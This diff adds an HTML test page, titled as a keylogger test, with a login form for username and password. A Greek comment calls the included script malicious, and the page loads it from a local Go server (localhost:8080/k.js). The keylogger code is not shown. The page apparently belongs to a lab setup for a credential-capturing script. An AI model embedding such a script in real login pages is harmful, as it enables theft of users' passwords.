@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>Login Portal - Keylogger Test</title>
+</head>
+<body>
+<h2>Test Login Form</h2>
+<!-- Ενσωμάτωση του malicious script από τον Go server -->
+<script src='http://localhost:8080/k.js'></script>
+<form action='#' method='post'>
+<label>Username:</label><br>
+<input name='username'/><br>
+<label>Password:</label><br>
+<input name='password'/><br><br>
+<input type="submit" value="Log In"/>
+</form>
+</body>
+</html>
